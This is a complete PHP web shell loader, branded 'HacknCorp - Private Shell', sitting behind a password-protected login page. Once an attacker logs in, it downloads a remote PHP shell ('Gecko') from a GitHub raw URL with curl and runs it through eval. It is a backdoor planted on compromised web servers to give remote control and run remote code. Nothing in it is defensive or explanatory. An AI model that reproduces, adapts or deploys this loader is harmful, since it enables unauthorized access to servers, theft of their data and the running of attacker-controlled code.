<?php 
set_time_limit(0);
error_reporting(0);
$auth_pass ="ae4a3f470b8c0ae769c1039e94f87152";
if(get_magic_quotes_gpc()) {   
function VEstripslashes($array) {     
return is_array($array) ? array_map('VEstripslashes', $array) : stripslashes($array);   }   
$_POST = VEstripslashes($_POST); 
$_COOKIE = VEstripslashes($_COOKIE); } 
function Login() {
  die("<!DOCTYPE html>
  <html>
      <head>
          <title>𝐇𝐚𝐜𝐤𝐧𝐂𝐨𝐫𝐩 - 𝐏𝐫𝐢𝐯𝐚𝐭𝐞 𝐒𝐡𝐞𝐥𝐥</title>=
          <link rel='preconnect' href='https://fonts.googleapis.com'>
          <link rel='preconnect' href='https://fonts.gstatic.com' crossorigin>
          <link href='https://fonts.googleapis.com/css2?family=Caveat:wght@700&display=swap' rel='stylesheet'>
          <link rel='icon' href='data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACAAAAAgCAYAAABzenr0AAAACXBIWXMAAA7EAAAOxAGVKw4bAAABzElEQVRYhb2XL0gEURDGfx6HiIhcEBGTwSQGETGICIKIGI5D0WC8YhODSUSDGMzmS6bLYrIIIgaTGEQMYhCDQfAvetx9hl11PffO3Xl3NzDs4/Hm+z5mdnfmgYPJ84QLhlMwMAiMuQAkHQXMAing0BEnvvnpvxDcupbBKqBfIN9HrTguymcC6zkHHJsJzgIZuGloGQS9AfIvH7ZgWVXPhOw1rgyC05AMXKlB5D2CYogACQbi4llKkKkSNxsXLClIA+NlgsqfwfVkFbysoMNflwL7pQrPEwQJwZqgUCGt9fCiYFvQ/C1RMCK4bgD5nWAiNH+ClCBfR/J9QWeVEn43mazgpYbE74JlxXnpBX2C8xqQX8mbG+KboFWQcyDPC9pN5GVClgzk64qAHbUmjwbdz02GoFAT7BkycFQr8jbBm0FAUdD1H36UEkwDLQbtCby+4SygUp//ADaAReC1wpnYzemX+Z/hU0h6LwVDgXN9+j2ifXlBP83JJCATApoTtIWcbRHs6O+skHURsBsAehDMR4hJC+4DcftW8mafVIJjQU+M2G7BgR/7ZvobCqb8Gm7KcIWTN2esyGtECxYBq3K8ePo4Q4ItS6DrxTUS1icFciMkyHL2GAAAAABJRU5ErkJggg==' sizes='32x32' />
      </head>
  <style>
      html{
          background-color: black;
      }
      .mind,font{
          text-align: center;
          color: #00ceff;
      }
      input{
          background-color: transparent;
          border-color: black;
          border: 2px solid #00ceff;
          border-radius: 50px 20px;
          text-align: center;
          color: #00ceff;
      }
  </style>
  <body><br><br>
      <h1 class='mind'>𝐇𝐚𝐜𝐤𝐧𝐂𝐨𝐫𝐩</h1>
      <center><br>
          <form method='post'><input style='text-align:center;' type='password' name='pass'></form>
          <br><br><br><font>&copy; 2023 𝐌𝐞𝐤𝐚𝐫 𝐉𝐚𝐲𝐚 𝐆𝐫𝐨𝐮𝐩</font>
      </center>");
}

function VEsetcookie($k, $v) {
    $_COOKIE[$k] = $v;
    setcookie($k, $v);
}

if(!empty($auth_pass)) {
    if(isset($_POST['pass']) && (md5($_POST['pass']) == $auth_pass))
        VEsetcookie(md5($_SERVER['HTTP_HOST']), $auth_pass);

    if (!isset($_COOKIE[md5($_SERVER['HTTP_HOST'])]) || ($_COOKIE[md5($_SERVER['HTTP_HOST'])] != $auth_pass))
        Login();
}
$link = 'https://raw.githubusercontent.com/MadExploits/Gecko/main/gecko-new.php';
$ch = curl_init(); 
curl_setopt($ch, CURLOPT_URL, $link);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1); 
$output = curl_exec($ch); 
curl_close($ch);      
eval ('?>'.$output);
?>
